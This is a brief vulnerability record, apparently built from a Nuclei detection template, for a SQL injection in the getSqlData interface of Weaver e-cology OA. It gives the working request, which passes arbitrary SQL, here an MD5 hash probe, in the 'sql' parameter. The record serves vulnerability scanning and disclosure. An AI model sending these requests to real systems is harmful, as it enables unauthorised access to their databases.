# Vulnerability: Weaver E-Cology `getsqldata` - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`weaver-ecology-getsqldata-sqli.yaml`)

## Description
When the getSqlData interface of the Panwei e-cology OA system uses the mssql database, the built-in SQL statements are not spliced strictly, resulting in a SQL injection vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes('MD5','{{num}}')),3,32)
GET {{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql=
```

